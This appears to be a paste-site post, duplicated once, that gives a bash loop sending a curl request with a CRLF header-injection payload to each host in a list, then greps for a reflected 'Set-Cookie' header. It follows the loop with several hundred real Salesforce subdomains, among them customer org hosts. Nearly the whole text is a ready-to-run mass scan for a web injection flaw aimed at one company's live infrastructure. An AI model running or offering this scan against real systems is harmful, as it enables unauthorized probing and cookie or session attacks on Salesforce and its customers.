

1) salesforce domains save to file:    any.list
2) in terminal paste this command:
 
--cut-here
while read -r line;do curl -s -I "https://$line/%0DSet-Cookie:crlf=injection;domain=.salesforce.com;" | grep '^Set-Cookie' | grep 'injection'; >> request.out;done < salesforce.list
--cut-here
 
the command test domain for domain in the salesforce file and do a curl request + payload (CRLF) , then grep look if there are a match with 2 strings "Set-Cookie" and "injection". If both match shows output with the vulnerable response
 
salesforce.list
 
www.salesforce.com
academic-alliance.salesforce.com
admin.salesforce.com
analyticsplayground.salesforce.com
ap.salesforce.com
ap0.salesforce.com
dcl5-ukb.ap0-ukb.salesforce.com
ap1.salesforce.com
dcl1-ukb.ap1-ukb.salesforce.com
dcl2-ukb.ap1-ukb.salesforce.com
dcl3-ukb.ap1-ukb.salesforce.com
dcl4-ukb.ap1-ukb.salesforce.com
dcl5-ukb.ap1-ukb.salesforce.com
dcl6-ukb.ap1-ukb.salesforce.com
dcl8-ukb.ap1-ukb.salesforce.com
ap2.salesforce.com
ap2-ukb.salesforce.com
dcl2-ukb.ap2-ukb.salesforce.com
dcl3-ukb.ap2-ukb.salesforce.com
dcl4-ukb.ap2-ukb.salesforce.com
dcl5-ukb.ap2-ukb.salesforce.com
dcl6-ukb.ap2-ukb.salesforce.com
dcl8-ukb.ap2-ukb.salesforce.com
ap3.salesforce.com
ap4.salesforce.com
dcl2-ukb.ap4-ukb.salesforce.com
ap5.salesforce.com
dcl8-ukb.ap5-ukb.salesforce.com
ap6.salesforce.com
dcl1-ukb.ap6-ukb.salesforce.com
dcl2-ukb.ap6-ukb.salesforce.com
dcl3-ukb.ap6-ukb.salesforce.com
dcl4-ukb.ap6-ukb.salesforce.com
dcl5-ukb.ap6-ukb.salesforce.com
dcl7-ukb.ap6-ukb.salesforce.com
dcl8-ukb.ap6-ukb.salesforce.com
ap7.salesforce.com
dpl7-syd.ap9-syd.salesforce.com
appexchange.salesforce.com
api.appexchange.salesforce.com
blog.salesforce.com
blogs.salesforce.com
us0odio66akt.2-wt7eam.eu7.bnc.salesforce.com
6wb8n6vme5fa.3-o4hoeai.na20.bnc.salesforce.com
c.salesforce.com
certification.salesforce.com
commercecloud.salesforce.com
app.commercecloud.salesforce.com
images.commercecloud.salesforce.com
community.salesforce.com
cs1.salesforce.com
cs10.salesforce.com
cs11.salesforce.com
dpl3-syd.cs115-syd.salesforce.com
cs12.salesforce.com
cs13.salesforce.com
sndbx--uspdev.cs13.salesforce.com
cs14.salesforce.com
dcl6-iad.cs14-iad.salesforce.com
cs15.salesforce.com
cs16.salesforce.com
cs17.salesforce.com
dcl3-iad.cs17-iad.salesforce.com
cs17-was-1.salesforce.com
cs18.salesforce.com
cs19.salesforce.com
cs2.salesforce.com
cs20.salesforce.com
cs21.salesforce.com
cs22.salesforce.com
cs23.salesforce.com
cs24.salesforce.com
cs25.salesforce.com
cs26.salesforce.com
cs26-was-1.salesforce.com
cs27.salesforce.com
cs28.salesforce.com
cs3.salesforce.com
cs30.salesforce.com
cs31.salesforce.com
cs32.salesforce.com
cs33.salesforce.com
cs4.salesforce.com
cs40.salesforce.com
cs41.salesforce.com
cs42.salesforce.com
cs43.salesforce.com
cs44.salesforce.com
cs45.salesforce.com
cs5.salesforce.com
dcl6-ukb.cs5-ukb.salesforce.com
dcl8-ukb.cs5-ukb.salesforce.com
cs50.salesforce.com
cs51.salesforce.com
cs52.salesforce.com
cs53.salesforce.com
cs54.salesforce.com
cs57.salesforce.com
cs58.salesforce.com
cs59.salesforce.com
cs6.salesforce.com
dcl3-ukb.cs6-ukb.salesforce.com
dcl6-ukb.cs6-ukb.salesforce.com
dcl7-ukb.cs6-ukb.salesforce.com
cs60.salesforce.com
cs61.salesforce.com
cs62.salesforce.com
cs63.salesforce.com
cs64.salesforce.com
dcl2-iad.cs64-iad.salesforce.com
dcl3-iad.cs64-iad.salesforce.com
dcl7-iad.cs64-iad.salesforce.com
cs66.salesforce.com
cs67.salesforce.com
dcl1-ord.cs67-ord.salesforce.com
dcl3-ord.cs67-ord.salesforce.com
cs7.salesforce.com
cs71.salesforce.com
cs72.salesforce.com
dcl2-iad.cs77-iad.salesforce.com
dcl5-iad.cs77-iad.salesforce.com
dcl6-iad.cs77-iad.salesforce.com
cs8.salesforce.com
cs80.salesforce.com
cs81.salesforce.com
cs82.salesforce.com
cs83.salesforce.com
cs84.salesforce.com
cs85.salesforce.com
cs86.salesforce.com
cs87.salesforce.com
cs88.salesforce.com
cs89.salesforce.com
cs9.salesforce.com
cs90.salesforce.com
cs91.salesforce.com
cs96.salesforce.com
developer.salesforce.com
dns01.salesforce.com
dns02.salesforce.com
dns03.salesforce.com
dns04.salesforce.com
dns05.salesforce.com
dns06.salesforce.com
files.docs.salesforce.com
mobile-web-tablet.docs.salesforce.com
releasenotes.docs.salesforce.com
resources.docs.salesforce.com
dreamforce.salesforce.com
dcl5-dfw.dfw.edge.salesforce.com
dcl3-phx.phx.edge.salesforce.com
emea.salesforce.com
engineering.salesforce.com
eu0.salesforce.com
eu1.salesforce.com
eu10.salesforce.com
eu11.salesforce.com
eu12.salesforce.com
eu13.salesforce.com
eu14.salesforce.com
eu15.salesforce.com
eu2.salesforce.com
eu3.salesforce.com
eu4.salesforce.com
eu5.salesforce.com
eu6.salesforce.com
eu7.salesforce.com
eu8.salesforce.com
eu9.salesforce.com
gs0.salesforce.com
www.gslb.salesforce.com
trust.gslb.salesforce.com
trust-chi.gslb.salesforce.com
trust-was.gslb.salesforce.com
www-was.gslb.salesforce.com
login.gslb2.salesforce.com
test.gslb2.salesforce.com
help.salesforce.com
ideaexchange.salesforce.com
insightexchange.salesforce.com
interactive.salesforce.com
investor.salesforce.com
orgchart.it.salesforce.com
login.l2.salesforce.com
login.salesforce.com
login-was1-2.salesforce.com
login-was2-1.salesforce.com
click.mail.salesforce.com
image.mail.salesforce.com
pages.mail.salesforce.com
view.mail.salesforce.com
app.news.marketing.salesforce.com
mobile.salesforce.com
mobilebeta.salesforce.com
mta.salesforce.com
101.53.164.238._spf.mta.salesforce.com
mx1-chi3.mta.salesforce.com
mx1-frf-sp1.mta.salesforce.com
mx1-lon.mta.salesforce.com
mx1-was3.mta.salesforce.com
mx1-wax.mta.salesforce.com
mx2-chi3.mta.salesforce.com
mx2-lon.mta.salesforce.com
mx2-par-sp1.mta.salesforce.com
mx2-phx-sp1.mta.salesforce.com
mx2-sjl.mta.salesforce.com
mx3-chi-sp4.mta.salesforce.com
mx3-chi3.mta.salesforce.com
mx3-frf-sp1.mta.salesforce.com
mx3-lon.mta.salesforce.com
mx3-phx-sp1.mta.salesforce.com
mx3-was.mta.salesforce.com
mx3-was3.mta.salesforce.com
mx4-chi3.mta.salesforce.com
mx4-dfw-sp1.mta.salesforce.com
mx4-dfw-sp2.mta.salesforce.com
mx4-frf-sp1.mta.salesforce.com
mx4-lon.mta.salesforce.com
mx4-phx-sp1.mta.salesforce.com
mx4-phx-sp2.mta.salesforce.com
mx4-was.mta.salesforce.com
mx4-was3.mta.salesforce.com
smtp01-dfw-sp1.mta.salesforce.com
smtp01-wax.mta.salesforce.com
smtp02-dfw-sp2.mta.salesforce.com
smtp02-lon.mta.salesforce.com
smtp03-lon.mta.salesforce.com
smtp04-lon.mta.salesforce.com
smtp04-was-sp4.mta.salesforce.com
smtp06-chi.mta.salesforce.com
smtp06-chi-sp4.mta.salesforce.com
smtp06-dfw-sp4.mta.salesforce.com
smtp06-phx-sp1.mta.salesforce.com
smtp06-tyo.mta.salesforce.com
smtp06-was.mta.salesforce.com
smtp06-was-sp4.mta.salesforce.com
smtp06-was3.mta.salesforce.com
smtp07-dfw-sp2.mta.salesforce.com
smtp07-phx-sp1.mta.salesforce.com
smtp07-was.mta.salesforce.com
smtp07-was-sp4.mta.salesforce.com
smtp07-was3.mta.salesforce.com
smtp09-chi3.mta.salesforce.com
smtp09-dfw-sp1.mta.salesforce.com
smtp09-tyo.mta.salesforce.com
smtp09-wax.mta.salesforce.com
smtp10-lon.mta.salesforce.com
smtp10-phx-sp1.mta.salesforce.com
smtp10-tyo.mta.salesforce.com
smtp10-was.mta.salesforce.com
smtp11-phx-sp1.mta.salesforce.com
smtp11-tyo.mta.salesforce.com
smtp11-was-sp4.mta.salesforce.com
smtp12-dfw-sp1.mta.salesforce.com
smtp12-phx-sp1.mta.salesforce.com
smtp12-sjl.mta.salesforce.com
smtp12-was3.mta.salesforce.com
smtp13-chi.mta.salesforce.com
smtp13-phx-sp1.mta.salesforce.com
smtp14-chi.mta.salesforce.com
smtp14-frf-sp1.mta.salesforce.com
smtp14-phx-sp1.mta.salesforce.com
smtp14-was.mta.salesforce.com
smtp14-was-sp4.mta.salesforce.com
smtp14-was3.mta.salesforce.com
smtp15-lon.mta.salesforce.com
smtp15-ukb-sp1.mta.salesforce.com
smtp15-was-sp4.mta.salesforce.com
accenture.my.salesforce.com
aimiaintranet.my.salesforce.com
akamai.my.salesforce.com
alliander.my.salesforce.com
aloha.my.salesforce.com
apache.my.salesforce.com
ascoeq.my.salesforce.com
asu.my.salesforce.com
au-portal.my.salesforce.com
azcn.my.salesforce.com
azusgb01.my.salesforce.com
bcbsa.my.salesforce.com
benefitmall.my.salesforce.com
bf.my.salesforce.com
blackboard.my.salesforce.com
brp.my.salesforce.com
calix.my.salesforce.com
canonical.my.salesforce.com
capbluecross.my.salesforce.com
cargill15.my.salesforce.com
carson.my.salesforce.com
cbrands.my.salesforce.com
ccadb.my.salesforce.com
ceat.my.salesforce.com
ceragon.my.salesforce.com
cmp-adecco.my.salesforce.com
cogecopeer1.my.salesforce.com
coty.my.salesforce.com
huawei--ebgbackup.cs6.my.salesforce.com
ctl.my.salesforce.com
dentegramx.my.salesforce.com
dfs.my.salesforce.com
eighteleven.my.salesforce.com
emc.my.salesforce.com
employeeservices-macysinc.my.salesforce.com
esri.my.salesforce.com
excel4apps.my.salesforce.com
exlibrisgroup.my.salesforce.com
fico.my.salesforce.com
fideliscare.my.salesforce.com
fitch.my.salesforce.com
fivestarinternational.my.salesforce.com
gapinc.my.salesforce.com
geog.my.salesforce.com
gss.my.salesforce.com
healthstream.my.salesforce.com
hesa.my.salesforce.com
hjgrad.my.salesforce.com
hnicorp.my.salesforce.com
hon-pmt.my.salesforce.com
huawei.my.salesforce.com
integro.my.salesforce.com
intuitb2b.my.salesforce.com
janssen.my.salesforce.com
kisales.my.salesforce.com
labu.my.salesforce.com
legrand-india.my.salesforce.com
loddon.my.salesforce.com
logicspot.my.salesforce.com
maersk.my.salesforce.com
marketo.my.salesforce.com
mediapro.my.salesforce.com
merrillcorp.my.salesforce.com
mhservicedesk.my.salesforce.com
morningstar.my.salesforce.com
my150internal.my.salesforce.com
nb.my.salesforce.com
netapp.my.salesforce.com
northcotthospitality.my.salesforce.com
numerix.my.salesforce.com
nutanix.my.salesforce.com
org62.my.salesforce.com
osu.my.salesforce.com
paratasso.my.salesforce.com
pgh.my.salesforce.com
ppccat.my.salesforce.com
qualcomm-cdmatech-support.my.salesforce.com
cs51-phx.phx.r.my.salesforce.com
sagegroup.my.salesforce.com
scotiabank.my.salesforce.com
se.my.salesforce.com
secureworks.my.salesforce.com
sf360.my.salesforce.com
sonicwall.my.salesforce.com
stanleycss.my.salesforce.com
tableau.my.salesforce.com
telstrat.my.salesforce.com
thoughtworks.my.salesforce.com
tibco.my.salesforce.com
titian.my.salesforce.com
towson.my.salesforce.com
twgsales.my.salesforce.com
txtav.my.salesforce.com
ucl.my.salesforce.com
uniandes.my.salesforce.com
unify.my.salesforce.com
usgcorp.my.salesforce.com
usps.my.salesforce.com
vaisala.my.salesforce.com
veritas.my.salesforce.com
vmware.my.salesforce.com
woodforest.my.salesforce.com
xdf.my.salesforce.com
ypo.my.salesforce.com
myworkspace.salesforce.com
fs.myworkspace.salesforce.com
na0.salesforce.com
na1.salesforce.com
na10.salesforce.com
na11.salesforce.com
na12.salesforce.com
na13.salesforce.com
na14.salesforce.com
na15.salesforce.com
na16.salesforce.com
na17.salesforce.com
na18.salesforce.com
na19.salesforce.com
na2.salesforce.com
na2-chi-1.salesforce.com
na2-chi-2.salesforce.com
na20.salesforce.com
na21.salesforce.com
na22.salesforce.com
na22-was-1.salesforce.com
na22-was-2.salesforce.com
na23.salesforce.com
na24.salesforce.com
na25.salesforce.com
na26.salesforce.com
na27.salesforce.com
na28.salesforce.com
na29.salesforce.com
na3.salesforce.com
na30.salesforce.com
na31.salesforce.com
na32.salesforce.com
na33.salesforce.com
na34.salesforce.com
na35.salesforce.com
na37.salesforce.com
na38.salesforce.com
na39.salesforce.com
na4.salesforce.com
na40.salesforce.com
na41.salesforce.com
na42.salesforce.com
na43.salesforce.com
na44.salesforce.com
na45.salesforce.com
na46.salesforce.com
na47.salesforce.com
na48.salesforce.com
na49.salesforce.com
na5.salesforce.com
na50.salesforce.com
na51.salesforce.com
na52.salesforce.com
na53.salesforce.com
na54.salesforce.com
na55.salesforce.com
na56.salesforce.com
na56-iad.salesforce.com
na57.salesforce.com
na58.salesforce.com
dcl2-ord.na58-ord.salesforce.com
na59.salesforce.com
na6.salesforce.com
na60.salesforce.com
na61.salesforce.com
na62.salesforce.com
na63.salesforce.com
na64.salesforce.com
na65.salesforce.com
dcl7-iad.na65-iad.salesforce.com
na66.salesforce.com
na67.salesforce.com
na68.salesforce.com
na69.salesforce.com
na7.salesforce.com
na72.salesforce.com
na73.salesforce.com
dcl4-iad.na73-iad.salesforce.com
na74.salesforce.com
na76.salesforce.com
na77.salesforce.com
na78.salesforce.com
na79.salesforce.com
na8.salesforce.com
na87.salesforce.com
na88.salesforce.com
na9.salesforce.com
na99.salesforce.com
ns1.salesforce.com
ns2.salesforce.com
ns3.salesforce.com
ns4.salesforce.com
partners.salesforce.com
omtr2.partners.salesforce.com
partnersignup.salesforce.com
prerellogin.pre.salesforce.com
prerelna1.pre.salesforce.com
proxy-chi2.salesforce.com
randy-maugans-i-iz-a-netelligent-limestone-geekstorage-whore.salesforce.com
docs.releasenotes.salesforce.com
trailhead.sdd.salesforce.com
sfma.salesforce.com
sha2test.salesforce.com
dcl5-phx.sr5.salesforce.com
dcl7-phx.sr5.salesforce.com
dcl2-dfw.sr6.salesforce.com
ssl.salesforce.com
startups.salesforce.com
status.salesforce.com
store.salesforce.com
success.salesforce.com
successjp.salesforce.com
sync.salesforce.com
mobile1.t.salesforce.com
tandc.salesforce.com
test.salesforce.com
tls1test.salesforce.com
trailhead.salesforce.com
api.trailhead.salesforce.com
qa4.trailhead.salesforce.com
trust.salesforce.com
content.trust.salesforce.com
research.trust.salesforce.com
ukb.salesforce.com
umps1-c1-frf.salesforce.com
1.umps1-c1-frf.salesforce.com
2.umps1-c1-frf.salesforce.com
0.umps1-c1-iad.salesforce.com
1.umps1-c1-iad.salesforce.com
3.umps1-c1-iad.salesforce.com
4.umps1-c1-iad.salesforce.com
umps1-c1-ukb.salesforce.com
0.umps1-c1-ukb.salesforce.com
1.umps1-c1-ukb.salesforce.com
2.umps1-c1-ukb.salesforce.com
3.umps1-c1-ukb.salesforce.com
4.umps1-c1-ukb.salesforce.com
5.umps1-c1-ukb.salesforce.com
dcl1-ukb.umps1-c1-ukb.salesforce.com
dcl6-ukb.umps1-c1-ukb.salesforce.com
umps1-c2-iad.salesforce.com
umps1-c2-ord.salesforce.com
0.umps1-c2-ord.salesforce.com
1.umps1-c2-ord.salesforce.com
2.umps1-c2-ord.salesforce.com
3.umps1-c2-ord.salesforce.com
4.umps1-c2-ord.salesforce.com
umps1-c2-ukb.salesforce.com
0.umps1-c2-ukb.salesforce.com
1.umps1-c2-ukb.salesforce.com
2.umps1-c2-ukb.salesforce.com
3.umps1-c2-ukb.salesforce.com
4.umps1-c2-ukb.salesforce.com
umps1-c3-hnd.salesforce.com
umps1-c3-iad.salesforce.com
0.umps1-c3-iad.salesforce.com
1.umps1-c3-iad.salesforce.com
3.umps1-c3-iad.salesforce.com
4.umps1-c3-iad.salesforce.com
umps1-c3-ukb.salesforce.com
0.umps1-c3-ukb.salesforce.com
1.umps1-c3-ukb.salesforce.com
2.umps1-c3-ukb.salesforce.com
3.umps1-c3-ukb.salesforce.com
4.umps1-c3-ukb.salesforce.com
5.umps1-c3-ukb.salesforce.com
6.umps1-c3-ukb.salesforce.com
nan.umps1-c3-ukb.salesforce.com
umps1-c4-iad.salesforce.com
0.umps1-c4-iad.salesforce.com
1.umps1-c4-iad.salesforce.com
2.umps1-c4-iad.salesforce.com
umps1-c4-ukb.salesforce.com
3.umps1-c4-ukb.salesforce.com
4.umps1-c4-ukb.salesforce.com
umps10.salesforce.com
0.umps10.salesforce.com
1.umps10.salesforce.com
2.umps10.salesforce.com
3.umps10.salesforce.com
4.umps10.salesforce.com
5.umps10.salesforce.com
0.umps1c3.salesforce.com
umps1c4.salesforce.com
0.umps1c4.salesforce.com
1.umps1c4.salesforce.com
2.umps1c4.salesforce.com
3.umps1c4.salesforce.com
4.umps1c4.salesforce.com
umps1t3.salesforce.com
0.umps1t3.salesforce.com
1.umps1t3.salesforce.com
2.umps1t3.salesforce.com
3.umps1t3.salesforce.com
4.umps1t3.salesforce.com
5.umps1t3.salesforce.com
6.umps1t3.salesforce.com
7.umps1t3.salesforce.com
nan.umps1t3.salesforce.com
umps1t4.salesforce.com
1.umps1t4.salesforce.com
umps1w3.salesforce.com
2.umps1w3.salesforce.com
4.umps1w3.salesforce.com
1.umps1w4.salesforce.com
0.umps2.salesforce.com
1.umps2.salesforce.com
2.umps2.salesforce.com
3.umps2.salesforce.com
4.umps2.salesforce.com
umps2-c1-ord.salesforce.com
2.umps2-c1-ord.salesforce.com
3.umps2-c2-phx.salesforce.com
umps2-c3-iad.salesforce.com
0.umps2-c3-iad.salesforce.com
1.umps2-c3-iad.salesforce.com
2.umps2-c3-iad.salesforce.com
3.umps2-c3-iad.salesforce.com
4.umps2-c3-iad.salesforce.com
umps2-c3-ord.salesforce.com
0.umps2-c3-ord.salesforce.com
1.umps2-c3-ord.salesforce.com
2.umps2-c3-ord.salesforce.com
3.umps2-c3-ord.salesforce.com
4.umps2-c3-ord.salesforce.com
umps2c1.salesforce.com
0.umps2c1.salesforce.com
3.umps2c1.salesforce.com
4.umps2c1.salesforce.com
umps2c2.salesforce.com
0.umps2c2.salesforce.com
1.umps2c2.salesforce.com
3.umps2c2.salesforce.com
1.umps2c3.salesforce.com
2.umps2c3.salesforce.com
3.umps2c3.salesforce.com
umps2c4.salesforce.com
1.umps2w1.salesforce.com
3.umps2w1.salesforce.com
umps2w3.salesforce.com
umps2w4.salesforce.com
0.umps2w4.salesforce.com
1.umps2w4.salesforce.com
2.umps2w4.salesforce.com
3.umps2w4.salesforce.com
4.umps2w4.salesforce.com
5.umps2w4.salesforce.com
umps3-c3-dfw.salesforce.com
0.umps3-c3-dfw.salesforce.com
1.umps3-c3-dfw.salesforce.com
4.umps3-c3-dfw.salesforce.com
umps5.salesforce.com
0.umps5.salesforce.com
1.umps5.salesforce.com
2.umps5.salesforce.com
3.umps5.salesforce.com
4.umps5.salesforce.com
umps8.salesforce.com
0.umps8.salesforce.com
1.umps8.salesforce.com
2.umps8.salesforce.com
3.umps8.salesforce.com
4.umps8.salesforce.com
umps9.salesforce.com
0.umps9.salesforce.com
1.umps9.salesforce.com
2.umps9.salesforce.com
3.umps9.salesforce.com
4.umps9.salesforce.com
5.umps9.salesforce.com
6.umps9.salesforce.com
nan.umps9.salesforce.com
webto.salesforce.com
www-chi-1.salesforce.com
www1.salesforce.com
RAW Paste Data

1) salesforce domains save to file:    salesforce.list
2) in terminal paste this command:

--cut-here
while read -r line;do curl -s -I "https://$line/%0DSet-Cookie:crlf=injection;domain=.salesforce.com;" | grep '^Set-Cookie' | grep 'injection'; >> request.out;done < salesforce.list 
--cut-here

the command test domain for domain in the salesforce file and do a curl request + payload (CRLF) , then grep look if there are a match with 2 strings "Set-Cookie" and "injection". If both match shows output with the vulnerable response

salesforce.list

www.salesforce.com
academic-alliance.salesforce.com
admin.salesforce.com
analyticsplayground.salesforce.com
ap.salesforce.com
ap0.salesforce.com
dcl5-ukb.ap0-ukb.salesforce.com
ap1.salesforce.com
dcl1-ukb.ap1-ukb.salesforce.com
dcl2-ukb.ap1-ukb.salesforce.com
dcl3-ukb.ap1-ukb.salesforce.com
dcl4-ukb.ap1-ukb.salesforce.com
dcl5-ukb.ap1-ukb.salesforce.com
dcl6-ukb.ap1-ukb.salesforce.com
dcl8-ukb.ap1-ukb.salesforce.com
ap2.salesforce.com
ap2-ukb.salesforce.com
dcl2-ukb.ap2-ukb.salesforce.com
dcl3-ukb.ap2-ukb.salesforce.com
dcl4-ukb.ap2-ukb.salesforce.com
dcl5-ukb.ap2-ukb.salesforce.com
dcl6-ukb.ap2-ukb.salesforce.com
dcl8-ukb.ap2-ukb.salesforce.com
ap3.salesforce.com
ap4.salesforce.com
dcl2-ukb.ap4-ukb.salesforce.com
ap5.salesforce.com
dcl8-ukb.ap5-ukb.salesforce.com
ap6.salesforce.com
dcl1-ukb.ap6-ukb.salesforce.com
dcl2-ukb.ap6-ukb.salesforce.com
dcl3-ukb.ap6-ukb.salesforce.com
dcl4-ukb.ap6-ukb.salesforce.com
dcl5-ukb.ap6-ukb.salesforce.com
dcl7-ukb.ap6-ukb.salesforce.com
dcl8-ukb.ap6-ukb.salesforce.com
ap7.salesforce.com
dpl7-syd.ap9-syd.salesforce.com
appexchange.salesforce.com
api.appexchange.salesforce.com
blog.salesforce.com
blogs.salesforce.com
us0odio66akt.2-wt7eam.eu7.bnc.salesforce.com
6wb8n6vme5fa.3-o4hoeai.na20.bnc.salesforce.com
c.salesforce.com
certification.salesforce.com
commercecloud.salesforce.com
app.commercecloud.salesforce.com
images.commercecloud.salesforce.com
community.salesforce.com
cs1.salesforce.com
cs10.salesforce.com
cs11.salesforce.com
dpl3-syd.cs115-syd.salesforce.com
cs12.salesforce.com
cs13.salesforce.com
sndbx--uspdev.cs13.salesforce.com
cs14.salesforce.com
dcl6-iad.cs14-iad.salesforce.com
cs15.salesforce.com
cs16.salesforce.com
cs17.salesforce.com
dcl3-iad.cs17-iad.salesforce.com
cs17-was-1.salesforce.com
cs18.salesforce.com
cs19.salesforce.com
cs2.salesforce.com
cs20.salesforce.com
cs21.salesforce.com
cs22.salesforce.com
cs23.salesforce.com
cs24.salesforce.com
cs25.salesforce.com
cs26.salesforce.com
cs26-was-1.salesforce.com
cs27.salesforce.com
cs28.salesforce.com
cs3.salesforce.com
cs30.salesforce.com
cs31.salesforce.com
cs32.salesforce.com
cs33.salesforce.com
cs4.salesforce.com
cs40.salesforce.com
cs41.salesforce.com
cs42.salesforce.com
cs43.salesforce.com
cs44.salesforce.com
cs45.salesforce.com
cs5.salesforce.com
dcl6-ukb.cs5-ukb.salesforce.com
dcl8-ukb.cs5-ukb.salesforce.com
cs50.salesforce.com
cs51.salesforce.com
cs52.salesforce.com
cs53.salesforce.com
cs54.salesforce.com
cs57.salesforce.com
cs58.salesforce.com
cs59.salesforce.com
cs6.salesforce.com
dcl3-ukb.cs6-ukb.salesforce.com
dcl6-ukb.cs6-ukb.salesforce.com
dcl7-ukb.cs6-ukb.salesforce.com
cs60.salesforce.com
cs61.salesforce.com
cs62.salesforce.com
cs63.salesforce.com
cs64.salesforce.com
dcl2-iad.cs64-iad.salesforce.com
dcl3-iad.cs64-iad.salesforce.com
dcl7-iad.cs64-iad.salesforce.com
cs66.salesforce.com
cs67.salesforce.com
dcl1-ord.cs67-ord.salesforce.com
dcl3-ord.cs67-ord.salesforce.com
cs7.salesforce.com
cs71.salesforce.com
cs72.salesforce.com
dcl2-iad.cs77-iad.salesforce.com
dcl5-iad.cs77-iad.salesforce.com
dcl6-iad.cs77-iad.salesforce.com
cs8.salesforce.com
cs80.salesforce.com
cs81.salesforce.com
cs82.salesforce.com
cs83.salesforce.com
cs84.salesforce.com
cs85.salesforce.com
cs86.salesforce.com
cs87.salesforce.com
cs88.salesforce.com
cs89.salesforce.com
cs9.salesforce.com
cs90.salesforce.com
cs91.salesforce.com
cs96.salesforce.com
developer.salesforce.com
dns01.salesforce.com
dns02.salesforce.com
dns03.salesforce.com
dns04.salesforce.com
dns05.salesforce.com
dns06.salesforce.com
files.docs.salesforce.com
mobile-web-tablet.docs.salesforce.com
releasenotes.docs.salesforce.com
resources.docs.salesforce.com
dreamforce.salesforce.com
dcl5-dfw.dfw.edge.salesforce.com
dcl3-phx.phx.edge.salesforce.com
emea.salesforce.com
engineering.salesforce.com
eu0.salesforce.com
eu1.salesforce.com
eu10.salesforce.com
eu11.salesforce.com
eu12.salesforce.com
eu13.salesforce.com
eu14.salesforce.com
eu15.salesforce.com
eu2.salesforce.com
eu3.salesforce.com
eu4.salesforce.com
eu5.salesforce.com
eu6.salesforce.com
eu7.salesforce.com
eu8.salesforce.com
eu9.salesforce.com
gs0.salesforce.com
www.gslb.salesforce.com
trust.gslb.salesforce.com
trust-chi.gslb.salesforce.com
trust-was.gslb.salesforce.com
www-was.gslb.salesforce.com
login.gslb2.salesforce.com
test.gslb2.salesforce.com
help.salesforce.com
ideaexchange.salesforce.com
insightexchange.salesforce.com
interactive.salesforce.com
investor.salesforce.com
orgchart.it.salesforce.com
login.l2.salesforce.com
login.salesforce.com
login-was1-2.salesforce.com
login-was2-1.salesforce.com
click.mail.salesforce.com
image.mail.salesforce.com
pages.mail.salesforce.com
view.mail.salesforce.com
app.news.marketing.salesforce.com
mobile.salesforce.com
mobilebeta.salesforce.com
mta.salesforce.com
101.53.164.238._spf.mta.salesforce.com
mx1-chi3.mta.salesforce.com
mx1-frf-sp1.mta.salesforce.com
mx1-lon.mta.salesforce.com
mx1-was3.mta.salesforce.com
mx1-wax.mta.salesforce.com
mx2-chi3.mta.salesforce.com
mx2-lon.mta.salesforce.com
mx2-par-sp1.mta.salesforce.com
mx2-phx-sp1.mta.salesforce.com
mx2-sjl.mta.salesforce.com
mx3-chi-sp4.mta.salesforce.com
mx3-chi3.mta.salesforce.com
mx3-frf-sp1.mta.salesforce.com
mx3-lon.mta.salesforce.com
mx3-phx-sp1.mta.salesforce.com
mx3-was.mta.salesforce.com
mx3-was3.mta.salesforce.com
mx4-chi3.mta.salesforce.com
mx4-dfw-sp1.mta.salesforce.com
mx4-dfw-sp2.mta.salesforce.com
mx4-frf-sp1.mta.salesforce.com
mx4-lon.mta.salesforce.com
mx4-phx-sp1.mta.salesforce.com
mx4-phx-sp2.mta.salesforce.com
mx4-was.mta.salesforce.com
mx4-was3.mta.salesforce.com
smtp01-dfw-sp1.mta.salesforce.com
smtp01-wax.mta.salesforce.com
smtp02-dfw-sp2.mta.salesforce.com
smtp02-lon.mta.salesforce.com
smtp03-lon.mta.salesforce.com
smtp04-lon.mta.salesforce.com
smtp04-was-sp4.mta.salesforce.com
smtp06-chi.mta.salesforce.com
smtp06-chi-sp4.mta.salesforce.com
smtp06-dfw-sp4.mta.salesforce.com
smtp06-phx-sp1.mta.salesforce.com
smtp06-tyo.mta.salesforce.com
smtp06-was.mta.salesforce.com
smtp06-was-sp4.mta.salesforce.com
smtp06-was3.mta.salesforce.com
smtp07-dfw-sp2.mta.salesforce.com
smtp07-phx-sp1.mta.salesforce.com
smtp07-was.mta.salesforce.com
smtp07-was-sp4.mta.salesforce.com
smtp07-was3.mta.salesforce.com
smtp09-chi3.mta.salesforce.com
smtp09-dfw-sp1.mta.salesforce.com
smtp09-tyo.mta.salesforce.com
smtp09-wax.mta.salesforce.com
smtp10-lon.mta.salesforce.com
smtp10-phx-sp1.mta.salesforce.com
smtp10-tyo.mta.salesforce.com
smtp10-was.mta.salesforce.com
smtp11-phx-sp1.mta.salesforce.com
smtp11-tyo.mta.salesforce.com
smtp11-was-sp4.mta.salesforce.com
smtp12-dfw-sp1.mta.salesforce.com
smtp12-phx-sp1.mta.salesforce.com
smtp12-sjl.mta.salesforce.com
smtp12-was3.mta.salesforce.com
smtp13-chi.mta.salesforce.com
smtp13-phx-sp1.mta.salesforce.com
smtp14-chi.mta.salesforce.com
smtp14-frf-sp1.mta.salesforce.com
smtp14-phx-sp1.mta.salesforce.com
smtp14-was.mta.salesforce.com
smtp14-was-sp4.mta.salesforce.com
smtp14-was3.mta.salesforce.com
smtp15-lon.mta.salesforce.com
smtp15-ukb-sp1.mta.salesforce.com
smtp15-was-sp4.mta.salesforce.com
accenture.my.salesforce.com
aimiaintranet.my.salesforce.com
akamai.my.salesforce.com
alliander.my.salesforce.com
aloha.my.salesforce.com
apache.my.salesforce.com
ascoeq.my.salesforce.com
asu.my.salesforce.com
au-portal.my.salesforce.com
azcn.my.salesforce.com
azusgb01.my.salesforce.com
bcbsa.my.salesforce.com
benefitmall.my.salesforce.com
bf.my.salesforce.com
blackboard.my.salesforce.com
brp.my.salesforce.com
calix.my.salesforce.com
canonical.my.salesforce.com
capbluecross.my.salesforce.com
cargill15.my.salesforce.com
carson.my.salesforce.com
cbrands.my.salesforce.com
ccadb.my.salesforce.com
ceat.my.salesforce.com
ceragon.my.salesforce.com
cmp-adecco.my.salesforce.com
cogecopeer1.my.salesforce.com
coty.my.salesforce.com
huawei--ebgbackup.cs6.my.salesforce.com
ctl.my.salesforce.com
dentegramx.my.salesforce.com
dfs.my.salesforce.com
eighteleven.my.salesforce.com
emc.my.salesforce.com
employeeservices-macysinc.my.salesforce.com
esri.my.salesforce.com
excel4apps.my.salesforce.com
exlibrisgroup.my.salesforce.com
fico.my.salesforce.com
fideliscare.my.salesforce.com
fitch.my.salesforce.com
fivestarinternational.my.salesforce.com
gapinc.my.salesforce.com
geog.my.salesforce.com
gss.my.salesforce.com
healthstream.my.salesforce.com
hesa.my.salesforce.com
hjgrad.my.salesforce.com
hnicorp.my.salesforce.com
hon-pmt.my.salesforce.com
huawei.my.salesforce.com
